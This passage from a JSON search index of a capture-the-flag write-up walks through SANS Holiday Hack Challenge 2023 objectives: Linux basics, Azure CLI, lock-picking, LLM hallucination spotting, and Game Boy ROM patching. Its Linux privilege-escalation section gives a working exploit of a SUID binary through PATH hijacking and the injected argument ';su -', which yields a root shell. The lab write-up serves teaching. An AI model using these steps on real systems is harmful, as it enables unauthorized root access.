session?</p>"},{"location":"objectives/o2_ci_l101/#solution","title":"Solution","text":"<p>Linux101 covers the basics. Linux Man Pages and Googling are always good resources to use for assistance.</p> <p>Perform a directory listing of your home directory to find a troll and retrieve a present!</p> <p>ls</p> <p>Now find the troll inside the troll.</p> <p>cat troll_19315479765589239</p> <p>Great, now remove the troll in your home directory.</p> <p>rm troll_19315479765589239</p> <p>Print the present working directory using a command.</p> <p>pwd</p> <p>Good job but it looks like another troll hid itself in your home directory. Find the hidden troll!</p> <p>ls -la</p> <p>Excellent, now find the troll in your command history.</p> <p>history | grep troll</p> <p>Find the troll in your environment variables.</p> <p>printenv | grep troll</p> <p>Next, head into the workshop.</p> <p>cd workshop/</p> <p>A troll is hiding in one of the workshop toolboxes. Use \"grep\" while ignoring case to find which toolbox the troll is in.</p> <p>grep -i troll *</p> <p>A troll is blocking the present_engine from starting. Run the present_engine binary to retrieve this troll.</p> <p>chmod +x present_engine ./present_engine</p> <p>Trolls have blown the fuses in /home/elf/workshop/electrical. cd into electrical and rename blown_fuse0 to fuse0.</p> <p>mv blown_fuse0 fuse0</p> <p>Now, make a symbolic link (symlink) named fuse1 that points to fuse0</p> <p>ln -s fuse0 fuse1</p> <p>Make a copy of fuse1 named fuse2.</p> <p>cp fuse1 fuse2</p> <p>We need to make sure trolls don't come back. Add the characters \"TROLL_REPELLENT\" into the file fuse2.</p> <p>echo \"TROLL_REPELLENT\" &gt;&gt; fuse2</p> <p>Find the troll somewhere in /opt/troll_den.</p> <p>find /opt/troll_den/ -iname troll.*</p> <p>Find the file somewhere in /opt/troll_den that is owned by the user troll.</p> <p>find /opt/troll_den/ -user troll</p> <p>Find the file created by trolls that is greater than 108 kilobytes and less than 110 kilobytes located somewhere in /opt/troll_den.</p> <p>find /opt/troll_den/ -size +108k -size -110k</p> <p>List running processes to find another troll.</p> <p>ps -aux</p> <p>The 14516_troll process is listening on a TCP port. Use a command to have the only listening port display to the screen.</p> <p>netstat -an | grep LISTEN</p> <p>The service listening on port 54321 is an HTTP server. Interact with this server to retrieve the last troll.</p> <p>curl localhost:54321</p> <p>Your final task is to stop the 14516_troll process to collect the remaining presents.</p> <p>kill -9 27781</p>"},{"location":"objectives/o2_ci_l101/#response","title":"Response","text":"<p>Ginger Breddie</p> <p>Wow, if your surfing skills are as good as your Linux skills, you could be winning competitions!</p>"},{"location":"objectives/o3_ci_rep/","title":"Reportinator","text":"<p>Difficulty:  Direct link: Reportinator</p>"},{"location":"objectives/o3_ci_rep/#objective","title":"Objective","text":"<p>Request</p> <p>Noel Boetie used ChatNPT to write a pentest report. Go to Christmas Island and help him clean it up.</p> Noel Boetie <p>Hey there, Noel Boetie speaking! I recently tried using ChatNPT to generate my penetration testing report. It's a pretty nifty tool, but there are a few issues in the output that I've noticed. I need some guidance in finding any errors in the way it generated the content, especially those odd hallucinations in the LLM output. I know it's not perfect, but I'd really appreciate the extra eyes on this one. Some of the issues might be subtle, so don't be afraid to dig deep and ask for further clarification if you're unsure. I've heard that you folks are experts about LLM outputs and their common issues, so I trust you can help me with this. Your input will be invaluable to me, so please feel free to share any insights or findings you may have. I'm looking forward to working with you all and improving the quality of the ChatNPT-generated penetration testing report. Thanks in advance for your help! I truly appreciate it! Let's make this report the best it can be!</p>"},{"location":"objectives/o3_ci_rep/#hints","title":"Hints","text":"Reportinator <p>I know AI sometimes can get specifics wrong unless the prompts are well written. Maybe chatNPT made some mistakes here.</p>"},{"location":"objectives/o3_ci_rep/#solution","title":"Solution","text":"<p>Though AI tools have proven to be very useful, it is still just a program, with information to work with and output based on that information it has. If left to it's own devices and unchecked, its value can be diminished.</p> <p>As ChatNPT is a bit of a black box, we just need to read through the report to identify what may be off.</p> <p>For finding number 3 \"Remote Code Execution via Java Deserialization of Stored Database Objects\", though the concept is correct, the finding is not. The statement \u201cBy intercepting HTTP request traffic on 88555/TCP\u201d is incorrect as there is no such port. TCP ports are only in the range of 0-65535 </p> <p>For finding number 6 \"Stored Cross-Site Scripting Vulnerabilities, again the concepts are there, but the statement \u201cusing Burp Suite to manipulate HTTP SEND\u201d is fabricated. There is no HTTP \"SEND\" method. HTTP Methods are well defined in RFC 9110</p> <p>For finding number 9 \"Internal IP Address Disclosure\", The statement \u201cWhen given an HTTP 7.4.33 request, and no Host header or one with no value,\u201d is made up. There is no \"HTTP 7.4.33\" request. The AI must have confused the Apache version with an HTTP request. Also, per MDN specifications, the HOST header must be sent in all HTTP/1.1 request messages.</p> <p>Care must be taken in AI Prompts, in the training of an AI, how it's configured, and how we validate the output. Here are some references I have found as starting points in learning more about Hallucinations, Prompt Engineering, and best practices https://www.codecademy.com/article/detecting-hallucinations-in-generative-ai https://arxiv.org/abs/2311.08117 https://zapier.com/blog/ai-hallucinations/ https://www.codecademy.com/resources/blog/ai-prompt-engineering-tips/</p> <p>Answer</p> <p></p>"},{"location":"objectives/o3_ci_rep/#response","title":"Response","text":"<p>Noel Boetie</p> <p>Great job on completing that challenge! Ever thought about how your newfound skills might come into play later on? Keep that mind sharp, and remember, today's victories are tomorrow's strategies!</p>"},{"location":"objectives/o4_ci_az101/","title":"Azure 101","text":"<p>Difficulty:  Direct link: Azure 101</p>"},{"location":"objectives/o4_ci_az101/#objective","title":"Objective","text":"<p>Request</p> <p>Help Sparkle Redberry with some Azure command line skills. Find the elf and the terminal on Christmas Island.</p> Sparkle Redberry <p>Hey, Sparkle Redberry here! So, I've been trying to learn about Azure and the Azure CLI and it's driving me nuts. Alabaster Snowball decided to use Azure to host some of his fancy new IT stuff on Geese Islands, and now us elves have to learn it too. Anyway, I know it's important and everyone says it's not as difficult as it seems, but honestly it still feels like quite a challenge for me. Alabaster sent us this Azure CLI reference as well. It's super handy, he said. Honestly, it just confuses me even more. If you can spare a moment, would you mind giving me a hand with this terminal? I'd be really grateful! Pretty please, with holly leaves on top!</p>"},{"location":"objectives/o4_ci_az101/#hints","title":"Hints","text":"Azure CLI Reference <p>The Azure CLI tools come with a builtin help system, but Microsoft also provides this handy cheatsheet.</p>"},{"location":"objectives/o4_ci_az101/#solution","title":"Solution","text":"<p>We are provided with another opportunity for a walk through of the Azure CLI commands and what they offer.</p> <p>You may not know this but the Azure cli help messages are very easy to access. First, try typing: az help | less</p> <p>az help | less</p> <p>Next, you've already been configured with credentials. Use 'az' and your 'account' to 'show' your current details and make sure to pipe to less ( | less )</p> <p>az account show | less </p> <p>Excellent! Now get a list of resource groups in Azure. For more information: https://learn.microsoft.com/en-us/cli/azure/group?view=azure-cli-latest</p> <p>az group list | less</p> <p>Ok, now use one of the resource groups to get a list of function apps. For more information: https://learn.microsoft.com/en-us/cli/azure/functionapp?view=azure-cli-latest Note: Some of the information returned from this command relates to other cloud assets used by Santa and his elves.</p> <p>az functionapp list -g northpole-rg1 | less</p> <p>Find a way to list the only VM in one of the resource groups you have access to. For more information: https://learn.microsoft.com/en-us/cli/azure/vm?view=azure-cli-latest</p> <p>az vm list -g northpole-rg2 | less</p> <p>Find a way to invoke a run-command against the only Virtual Machine (VM) so you can RunShellScript and get a directory listing to reveal a file on the Azure VM. For more information: https://learn.microsoft.com/en-us/cli/azure/vm/run-command?view=azure-cli-latest#az-vm-run-command-invoke</p> <p>az vm run-command invoke -g northpole-rg2 -n NP-VM1 --command-id RunShellScript --scripts \"ls\"</p> <p>Answer</p> <p></p>"},{"location":"objectives/o4_ci_az101/#response","title":"Response","text":"<p>Sparkle Redberry</p> <p>Wow, you did it! It makes quite a bit more sense to me now. Thank you so much! That Azure Function App URL you came across in the terminal looked interesting. It might be part of that new project Alabaster has been working on with the help of ChatNPT. Let me tell you, since he started using ChatNPT he's been introducing a lot of amazing innovation across the islands. Knowing Alabaster, he'll be delighted to tell you all about it! I think I last saw him on Pixel island. By the way, as part of the Azure documentation he sent the elves, Alabaster also noted that if Azure CLI tools aren't available in an Azure VM we should use the Azure REST API instead. I'm not really sure what that means, but I guess I know what I'll be studying up on next.</p>"},{"location":"objectives/o5_mt_ll/","title":"Luggage Lock","text":"<p>Difficulty:  Direct link: Luggage Lock</p>"},{"location":"objectives/o5_mt_ll/#objective","title":"Objective","text":"<p>Request</p> <p>Help Garland Candlesticks on the Island of Misfit Toys get back into his luggage by finding the correct position for all four dials</p> Garland Candlesticks <p>Hey there, I'm Garland Candlesticks! I could really use your help with something. You see, I have this important pamphlet in my luggage, but I just can't remember the combination to open it! Chris Elgee gave a talk recently that might help me with this problem. Did you attend that? I seem to recall Chris mentioning a technique to figure out the combinations... I have faith in you! We'll get that luggage open in no time. This pamphlet is crucial for me, so I can't thank you enough for your assistance. Once we retrieve it, I promise to treat you to a frosty snack on me!</p>"},{"location":"objectives/o5_mt_ll/#hints","title":"Hints","text":"Lock Talk <p>Check out Chris Elgee's talk regarding his and his wife's luggage. Sounds weird but interesting!</p>"},{"location":"objectives/o5_mt_ll/#solution","title":"Solution","text":"<p>It's all about feel. We see that there are 5 degrees of pressure we can apply virtually. So, we begin with a single click of pressure and slowly move the closest dial until we get some resistance. We then slowly add a click or two of resistance and repeat for each dial.</p> <p>If we do this right, starting with the dial closest to the button and gradually adding pressure, we should be able to unlock the bag.</p> <p>Answer</p>"},{"location":"objectives/o5_mt_ll/#response","title":"Response","text":"<p>Garland Candlesticks</p> <p>Wow, you did it! I knew you could crack the code. Thank you so much!</p>"},{"location":"objectives/o6_mt_priv/","title":"Linux PrivEsc","text":"<p>Difficulty:  Direct link: Linux PrivEsc</p>"},{"location":"objectives/o6_mt_priv/#objective","title":"Objective","text":"<p>Request</p> <p>Rose Mold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.</p> Rose Mold <p>What am I doing in this saloon? The better question is: what planet are you from? Yes, I\u2019m a troll from the Planet Frost. I decided to stay on Earth after Holiday Hack 2021 and live among the elves because I made such dear friends here. Whatever. Do you know much about privilege escalation techniques on Linux? You're asking why? How about I'll tell you why after you help me. And you might have to use that big brain of yours to get creative, bub.</p>"},{"location":"objectives/o6_mt_priv/#hints","title":"Hints","text":"Linux Privilege Escalation Techniques <p>There's various ways to escalate privileges on a Linux system. </p> Linux Command Injection <p>Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.</p>"},{"location":"objectives/o6_mt_priv/#solution","title":"Solution","text":"<p>Logging into the system, we need to escalate our privileges so we can run a binary in the /root directory. We start checking the system to determine how best to proceed.</p> <pre><code>elf@6dcd4737c4c8:~$ whoami\nelf\nelf@6dcd4737c4c8:~$ uname -a\nLinux 6dcd4737c4c8 5.10.0-26-cloud-amd64 #1 SMP Debian 5.10.197-1 (2023-09-29) x86_64 x86_64 x86_64 GNU/Linux\nelf@6dcd4737c4c8:~$ netstat -antup \nbash: netstat: command not found\nelf@6dcd4737c4c8:~$ ps -aux | grep root\nelf           14  0.0  0.0   3312   720 pts/0    S+   02:24   0:00 grep --color=auto root\n</code></pre> <p>We are logged in as \"elf\", the kernel version does not appear to have any readily available exploits to leverage for privilege escalation, and doesn't look like we have any running services we could take advantage of.</p> <pre><code>elf@6dcd4737c4c8:~$ find / -perm -u=s -type f 2&gt;/dev/null \n/usr/bin/chfn\n/usr/bin/chsh\n/usr/bin/mount\n/usr/bin/newgrp\n/usr/bin/su\n/usr/bin/gpasswd\n/usr/bin/umount\n/usr/bin/passwd\n/usr/bin/simplecopy\n</code></pre> <p>This \"simplecopy\" I am not familiar with, so that might be worth investigating</p> <pre><code>elf@6dcd4737c4c8:~$ ls -la /usr/bin/simplecopy\n-rwsr-xr-x 1 root root 16952 Dec  2 22:17 /usr/bin/simplecopy\nelf@6dcd4737c4c8:~$ simplecopy\nUsage: simplecopy &lt;source&gt; &lt;destination&gt;\n</code></pre> <p>Simplecopy is owned by root though I'm not sure why we have this when we can just use \"cp\" to copy files. </p> <pre><code>elf@6dcd4737c4c8:~$ strings /usr/bin/simplecopy\n/lib64/ld-linux-x86-64.so.2\nlibc.so.6\nsetuid\n...\nUsage: %s &lt;source&gt; &lt;destination&gt;\ncp %s %s\n:*3$\"\nGCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0\n</code></pre> <p>That's interesting that it appears simplecopy is just using \"cp\". Though, it's not defining the full path to \"cp\". Maybe we can leverage that to run what we want as root.</p> <p><pre><code>elf@6dcd4737c4c8:~$ cp /bin/bash ./cp\nelf@6dcd4737c4c8:~$ export PATH=.:$PATH\nelf@6dcd4737c4c8:~$ simplecopy ls  \nUsage: simplecopy &lt;source&gt; &lt;destination&gt;\nelf@6dcd4737c4c8:~$ simplecopy ls .\n/usr/bin/ls: /usr/bin/ls: cannot execute binary file\n</code></pre> After copying bash to the local directory as cp, and adding the local working directory to the PATH environment variable, we can confirm that simplecopy now tries to run the arguments with bash, effectively running \"bash %s %s\". We can certainly pass a script to the first variable, but perhaps we can pass commands as well with the second, so we end up with something like \"bash script ; second command\"</p> <pre><code>elf@6dcd4737c4c8:~$ echo \"ls -la /root\" &gt; cmd\nelf@6dcd4737c4c8:~$ simplecopy cmd \".\"\ntotal 620\ndrwx------ 1 root root   4096 Dec  2 22:17 .\ndrwxr-xr-x 1 root root   4096 Jan  3 02:23 ..\n-rw-r--r-- 1 root root   3106 Dec  5  2019 .bashrc\n-rw-r--r-- 1 root root    161 Dec  5  2019 .profile\n-rws------ 1 root root 612560 Nov  9 21:29 runmetoanswer\nelf@6dcd4737c4c8:~$ simplecopy . \";su -\"\n.: .: Is a directory\nroot@6dcd4737c4c8:~#\n</code></pre> <p>We now have root, though trying to run runmetoanswer results in an error:</p> <pre><code>root@6dcd4737c4c8:~# ./runmetoanswer \nThere is something wrong with your environment; the most likely reason is that\nthe RESOURCE_ID environmental variable is missing - that can happen if you're using sudo\nor su or some other process that alters the environment. If this persists, please\nask for help!\n\nThe error message is: Couldn't get resource_id from the environmental variable RESOURCE_ID: environment variable not found\n</code></pre> <p>Running printenv from both elf and root does show \"RESOURCE_ID\" does not exist for root. </p> <pre><code>root@6dcd4737c4c8:~# export RESOURCE_ID=ad963c6e-15bb-44c4-84f4-c438a4795803\nroot@6dcd4737c4c8:~# ./runmetoanswer \nWho delivers Christmas presents?\n\n&gt; \n</code></pre> <p>Looking to find the answer, I copied runmetoanswer back to /home/elf, used chown to set owner to elf:elf, and ran runmetoanswer as elf where I recieved an error pointing to /etc/runtoanswer.yaml</p> <pre><code>oot@6dcd4737c4c8:~# cat /etc/runtoanswer.yaml \n# This is the config file for runtoanswer, where you can set up your challenge!\n---\n\n# This is the completionSecret from the Content sheet - don't tell the user this!\nkey: b08b538569e395f88e12ef9fe751ac39\n\n# The answer that the user is expected to enter - case sensitive\n# (This is optional - if you don't have an answer, then running this will immediately win)\nanswer: \"santa\"\n</code></pre> <p>Answer</p> <pre><code>root@6dcd4737c4c8:~# ./runmetoanswer \nWho delivers Christmas presents?\n\n&gt; santa\nYour answer: santa\n\nChecking....\nYour answer is correct!\n</code></pre>"},{"location":"objectives/o6_mt_priv/#response","title":"Response","text":"<p>Rose Mold</p> <p>Yup, I knew you knew. You just have that vibe. To answer your question of why from earlier... Nunya! But, I will tell you something better, about some information I... found. There's a hidden, uncharted area somewhere along the coast of this island, and there may be more around the other islands. The area is supposed to have something on it that's totes worth, but I hear all the bad vibe toys chill there. That's all I got. K byyeeeee. Ugh... n00bs... </p>"},{"location":"objectives/o7_si_flc/","title":"Faster Lock Combination","text":"<p>Difficulty:  Direct link: Faster Lock</p>"},{"location":"objectives/o7_si_flc/#objective","title":"Objective","text":"<p>Request</p> <p>Over on Steampunk Island, Bow Ninecandle is having trouble opening a padlock. Do some research and see if you can help open it!</p> Bow Ninecandle <p>Hey there! I'm Bow Ninecandle, and I've got a bit of a... 'pressing' situation. You see, I need to get into the lavatory, but here's the twist: it's secured with a combination padlock. Talk about bad timing, right? I could really use your help to figure this out before things get... well, urgent. I'm sure there are some clever tricks and tips floating around the web that can help us crack this code without too much of a flush... I mean fuss. Remember, we're aiming for quick and easy solutions here - nothing too complex. Once we've gathered a few possible combinations, let's team up and try them out. I'm crossing my legs - I mean fingers - hoping we can unlock this door soon. After all, everyone knows that the key to holiday happiness is an accessible lavatory! Let's dive into this challenge and hopefully, we won't have to 'hold it' for too long! Ready to help me out?</p>"},{"location":"objectives/o7_si_flc/#solution","title":"Solution","text":"<p>The standard Master... I mean Faster Combination Lock has some well documented flaws. Similar to the luggage locks, we have some tension techniques to help us identify numbers of the combination.</p> <p>Here are a couple references to help us: https://www.youtube.com/watch?v=uurLUFlduU8 https://www.youtube.com/watch?v=09UgmwtL12c</p> <p>Watching the videos and reading, the first number can be found by applying slight tension and feeling for a sticking point. From there add 5 and that's your first number. The second number is always a factor of +2 and then multiples of 4. So if the first number is 2, then the second number is either 4, 8, 12, 16, etc. The third number can be found by turning the dial the opposite direction and looking for a hard sticking point.</p> <p>Based on this, we see the sticking point is at about 30, which would put the first digit at 35. Moving to the second number we start with adding 2, and then going multiples of 4. We can see that reset status goes red, which indicates a wrong numbers, so we move on.</p> <p>We see the second number is 5, so now we just try every number until we are able to unlock</p> <p>Answer</p> <p>The combination for this lock is 35, 5, 15</p>"},{"location":"objectives/o7_si_flc/#response","title":"Response","text":"<p>Bow Ninecandle</p> <p>Oh, thank heavens! You're a lifesaver! With your knack for cracking codes, we've just turned a potential 'loo catastrophe' into a holiday triumph!</p>"},{"location":"objectives/o8_gc1/","title":"Game Cartridges: Vol 1","text":"<p>Difficulty:  Direct link: GameBoy1</p>"},{"location":"objectives/o8_gc1/#objective","title":"Objective","text":"<p>Request</p> <p>Find the first Gamegosling cartridge and beat the game</p> Dusty Giftwrap <p>Arrr, matey, shiver me timbers! There be buried treasure herrrrre. Just kidding, I'm not really a pirate, I was just hoping it would make finding the treasure easier. I guess you heard about the fabled buried treasure, too? I didn't expect to see anyone else here. This uncharted islet was hard to find. There are 3 buried treasures in total, each in its own uncharted area around Geese Islands. I've been searching for hours now with no luck, and these strange toys are starting to give me the creeps. Maybe you'll be able to find it. Here, use my Gameboy Cartridge Detector. Go into your items and test it to make sure it's still working. When you get close to the treasure, it'll start sounding off. The closer you get, the louder the sound. No need to activate or fiddle with it. It just works! I bet one of these creepy toys has the treasure, and I'm sure not going anywhere near them! If you find the treasure, come back and show me, and I'll tell you what I was able to research about it. Good luck!</p>"},{"location":"objectives/o8_gc1/#hints","title":"Hints","text":"Gameboy 1 <p>1) Giving things a little push never hurts. 2) Out of sight but not out of ear-shot 3) You think you fixed the QR code? Did you scan it and see where it leads?</p>"},{"location":"objectives/o8_gc1/#solution","title":"Solution","text":"<p>It's been a while since I've played a Gameboy game. It's bringing me back.</p> <p>After loading and starting a new game, we go through our introductions and move through the map</p> <p> Ugh! Why in the world does the game world look so disastrously bad? GRUMBLE*     When I find the ne'er-do-weller who skimped out on the assets for this game!</p> <p> Woof Hi, I'm Kody! Can you plz fix this QR Code? The developers cheaped out and now a few using-song blocks are not in the correct position. If you sing to the blocks that are misplaced, they will sing back! Try singing to the block to the south of my position. Hopefully you can fix the misaligned QR blocks.</p> <p></p> <p> This one we had to move out and around, looking for the spot as it wasn't in the immediate area</p> <p></p> It's very important to do blocks 3-7 in order, otherwise you won't be able to move them <p> </p> <p></p> <p>We scan the QR code which gives us the website https://8bitelf.com/</p> <pre><code>$ curl https://8bitelf.com\n&lt;html&gt;\n    &lt;body&gt;\n        &lt;p&gt;flag:santaconfusedgivingplanetsqrcode&lt;/p&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Answer</p> <p>santaconfusedgivingplanetsqrcode</p>"},{"location":"objectives/o8_gc1/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>Whoa, you found it! It's a... video game cartridge? Coooooollll... I mean, arrrrrr.... So, here's what my research uncovered. Not sure what it all means, maybe you can make sense of it.  You have all three? I think that makes you ruler of the pirates!</p>"},{"location":"objectives/o9_gc2/","title":"Game Cartridges: Vol 2","text":"<p>Difficulty:  Direct link: GameBoy2</p>"},{"location":"objectives/o9_gc2/#objective","title":"Objective","text":"<p>Request</p> <p>Find the second Gamegosling cartridge and beat the game</p> Tinsel Upatree <p>I can't believe I was actually able to find this underground cavern! I discovered what looked liike an old pirate map in the attic of one of those huts in Rainraster Cliffs, and it actually led somewhere! But now that I've seen where it leads, I think this might've been a bad idea. This place is scary! Maybe you want to take it from here?</p>"},{"location":"objectives/o9_gc2/#hints","title":"Hints","text":"Gameboy 2 <p>1) This feels the same, but different! 2) If it feels like you are going crazy, you probably are! Or maybe, just maybe, you've not yet figured out where the hidden ROM is hiding. 3) I think I may need to get a DIFFerent perspective. 4) I wonder if someone can give me a few pointers to swap.</p>"},{"location":"objectives/o9_gc2/#solution","title":"Solution","text":"<p>We appear to start Vol 2 in the same manners as Vol 1</p> <p> PREVIOUSLY ON HOLIDAY HACKJared: Elf, have you ever heard of a miner named Tom Liston?Elf: Blah blah blah... I'm not listening to this again! Glooooooory!  T-wiz: You shall not pass!!!CHUCKLEI've always wanted to say that!</p> <p>But we appear to be stuck. There were comments of a different version. </p> <p>Looking at the developer tools, network tab, we see game loaded https://gamegosling.com/vol2-akHB27gg6pN0/rom/game1.gb The console shows: rom/game1.gb, and https://gamegosling.com/vol2-akHB27gg6pN0/js/script.js shows the following :</p> <p><pre><code>// User configurable.\nconst ROM_FILENAME = \"rom/game\";\n...\n// Load a ROM.\n(async function go() {\n  let ranNum = Math.round(Math.random()).toString()\n  let filename = ROM_FILENAME + ranNum + \".gb\";\n  console.log(filename);\n  let response = await fetch(filename);\n  let romBuffer = await response.arrayBuffer();\n  const extRam = new Uint8Array(JSON.parse(localStorage.getItem(\"extram\")));\n  Emulator.start(await binjgbPromise, romBuffer, extRam);\n  emulator.setBuiltinPalette(vm.palIdx);\n})();\n</code></pre> According to MDN </p> <p>Quote</p> <p>The Math.random() static method returns a floating-point, pseudo-random number that's greater than or equal to 0 and less than 1</p> <p>And with the rounding, means that the file is going to be either game0.gb or game1.gb. As we have game1.gb, let's download game0.gb</p> Linux DiffWindows Powershell <pre><code>diff &lt;(xxd game0.gb) &lt;(xxd game1.gb)\n</code></pre> <pre><code>Compare-Object (Format-Hex .\\game0.gb) (Format-Hex .\\game1.gb)\n</code></pre> <p>We are provided with the following output with game0 indicated by &lt;, and game1 indicated by &gt;</p> <p><pre><code>21c21\n&lt; 00000140: 0000 0000 3030 001b 0203 0033 0142 71b3  ....00.....3.Bq.\n---\n&gt; 00000140: 0000 0000 3030 001b 0203 0033 0142 7186  ....00.....3.Bq.\n90c90\n&lt; 00000590: 5405 050b 4b9a 2300 0000 0000 06ad 4210  T...K.#.......B.\n---\n&gt; 00000590: 5405 05d2 ac3d 2d00 0000 0000 06ad 4210  T....=-.......B.\n5801c5801\n&lt; 00016a80: 2080 0c80 0300 000f f807 0000 0000 0f10   ...............\n---\n&gt; 00016a80: 2080 0c80 0b00 000f f807 0000 0000 0f10   ...............\n5804c5804\n&lt; 00016ab0: 0000 0000 2000 0600 0900 000f f807 0000  .... ...........\n---\n&gt; 00016ab0: 0000 0000 2000 0600 0600 000f f807 0000  .... ...........\n6089c6089\n&lt; 00017c80: 0200 fe80 002a 0013 fffe fffb 13ff ffff  .....*..........\n---\n&gt; 00017c80: 0100 fe80 002a 0013 fffe fffb 13ff ffff  .....*..........\n6225,6226c6225,6226\n&lt; 00018500: 1204 2103 c60d 5701 1400 00ff fc14 0280  ..!...W.........\n&lt; 00018510: fffd 140b 80ff fe35 fffc 3200 fffc 2703  .......5..2...'.\n---\n&gt; 00018500: 1204 2103 c60d 5701 1400 00ff fc14 0300  ..!...W.........\n&gt; 00018510: fffd 1404 00ff fe35 fffc 3200 fffc 2703  .......5..2...'.\n</code></pre> Let's take game0.gb, and update it with the information from game1.gb, one line at a time, and try to run the modified version.</p> <p>I found https://web.libretro.com/ as an online emulator, or https://emulicious.net/ as a potential local emulator. I'm sure there are many others, so players, use your tool of choice.</p> <p>Changing byte 0x14F from B3 to 86 did not make any change.  0x593 to 0x596 has a few bytes so left that alone and moved to 0x16a84 and changed 03 to 0B.</p> <p></p> <p>We have a portal!</p> <p></p> <p>Playing the radio gives us the following morse code:</p> <p><pre><code>--. .-.. ----- .-. -.\u2014 \n</code></pre> Using International Morse Code reference, we can then translate that to our answer</p> <p>Answer</p> <p>GL0RY</p>"},{"location":"objectives/o9_gc2/#response","title":"Response","text":"<p>Tinsel Upatree</p> <p>Whoa, you found it! What version is it? Did you know that many games had multiple versions released? Word is: volume 2 has 2 versions!  You have all three? What a glorious collection!</p>"},{"location":"objectives/o_template/","title":"Insert Objective 2 Title","text":"<p>Difficulty:  Direct link: Objective 2 website</p>"},{"location":"objectives/o_template/#objective","title":"Objective","text":"<p>Request</p> <p>Insert the objective description from your badge.</p> Insert Elf Name <p>Copy the first part of the conversation with Elf Name here You can use <code>&lt;br/&gt;</code> to ensure each sentence starts on a new line.</p>"},{"location":"objectives/o_template/#hints","title":"Hints","text":"Insert Hint 1 Title <p>Along the way you will receive different hints. Insert them here.</p> Insert Hint 2 Title <p>Along the way you will receive different hints. Insert them here.</p>"},{"location":"objectives/o_template/#solution","title":"Solution","text":"<p>This section explains the different steps taken to solve the challenge. Try to find a good balance between providing sufficient detail and not overloading the reader with too much information. Use admonitions, images, diagrams, code blocks, and tables to highlight and structure important information or provide additional clarification.</p>"},{"location":"objectives/o_template/#admonitions","title":"Admonitions","text":"<p>Anchor the decorations</p> <p>Ensure that all festive decorations, especially electrical ones, are securely anchored. We don\u2019t want them floating off into the tropical sunset!</p> <p>Palm tree lighting</p> <p>While on the island, make sure to hang your Christmas lights on a palm tree. It\u2019s not only festive but also a great beacon for Santa to find you!</p>"},{"location":"objectives/o_template/#images","title":"Images","text":""},{"location":"objectives/o_template/#diagrams","title":"Diagrams","text":"<pre><code>sequenceDiagram\n  autonumber\n  Santa-&gt;&gt;Elf: Hey Elf, is the Naughty-or-Nice List secured?\n  loop Security Check\n      Elf-&gt;&gt;Elf: Ensuring list is encrypted\n  end\n  Note right of Elf: Using candy-cane encryption!\n  Elf--&gt;&gt;Santa: Safe and sound, Santa!\n  Santa-&gt;&gt;Reindeer: Rudolph, did you patch the sleigh's software?\n  Note left of Reindeer: Checking for reindeerOS updates...\n  Reindeer--&gt;&gt;Santa: All patched and glowing bright!</code></pre>"},{"location":"objectives/o_template/#code-blocks","title":"Code blocks","text":"Countdown script (with line 7 highlighted)<pre><code>#!/bin/bash\necho \"Christmas Holiday Countdown\"\n\ndays_until_xmas=$(($(date -d \"Dec 25\" +%j) - $(date +%j)))\n\nif [ $days_until_xmas -ge 0 ]; then\n  echo \"Only $days_until_xmas days until Christmas!\"\nelse\n  echo \"Christmas has passed! Hope you had a great time!\"\nfi\n</code></pre>"},{"location":"objectives/o_template/#tables","title":"Tables","text":"Activity Santa's Verdict Elf Comments Iceberg Surfing Risky Business \"Lost three surfboards!\" Polar Bear Hugs Approach with Caution \"Fluffy but... brisk.\" Snow Fort Building Highly Recommended \"Elf-sized doorways only.\" Aurora Light Chasing Magical Experience \"Better than Christmas lights!\" Penguin Parade Absolute Must-See \"They're oddly organized!\" <p>Answer</p> <p>Insert the answer to the objective here.</p>"},{"location":"objectives/o_template/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>Copy the final part of the conversation with Elf Name here.</p>"}]}